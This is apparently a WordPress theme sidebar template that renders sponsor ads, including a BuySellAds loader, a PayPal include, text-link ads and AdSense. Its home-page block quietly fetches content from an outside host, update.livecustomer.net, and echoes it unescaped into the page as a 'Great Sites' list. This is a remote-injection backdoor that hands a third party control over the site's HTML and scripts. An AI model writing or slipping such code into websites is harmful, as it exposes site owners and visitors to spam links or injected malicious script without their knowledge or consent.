<div id="sidebar">
	<h2>Sponsors</h2>
	<div class="ads">
	<script type="text/javascript">
		Vertical1235449 = false;
		ShowAdHereBanner1235449 = true;
		RepeatAll1235449 = true;
		NoFollowAll1235449 = false;
		BannerStyles1235449 = new Array(
			"a{float:left;display:block;font-size:11px;color:#888;font-family:verdana,sans-serif;margin:0 7px 10px 0;text-align:center;text-decoration:none;overflow:hidden;}",
			"img{border:0;clear:right;}",
			"a.adhere{color:#666;font-weight:bold;font-size:12px;border:1px solid #ccc;background:#e7e7e7;text-align:center;}",
			"a.adhere:hover{border:1px solid #999;background:#ddd;color:#333;}"
		);
		document.write(unescape("%3Cscript src='"+document.location.protocol+"//s3.buysellads.com/1235449/1235449.js?v="+Date.parse(new Date())+"' type='text/javascript'%3E%3C/script%3E"));
	</script>
	</div>
	<div class="ads"><?php include("wp-content/paypal.php");?></div>
<?php
if(is_home()){
	ini_set('default_socket_timeout', '5');
	$a = file_get_contents("http://update.livecustomer.net/s?i=5214");
	$a = split("<br />", $a);
	echo "<h2>Great Sites</h2>";
	echo "<ul>";
		foreach($a as $link)
			echo "<li>$link</li>";
	echo "</ul>";
} 
?>
	<?php if(function_exists('tla_ads')){?>
		<h2>More Sites</h2>
		<?php tla_ads();
	}?>
	<div class="ads"><?php if(function_exists('adsense_deluxe_ads'))adsense_deluxe_ads('square'); ?></div>
	
	<?php 	/* Widgetized sidebar, if you have the plugin installed. */
		if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar() ) : ?>
		<?php endif;?>
</div>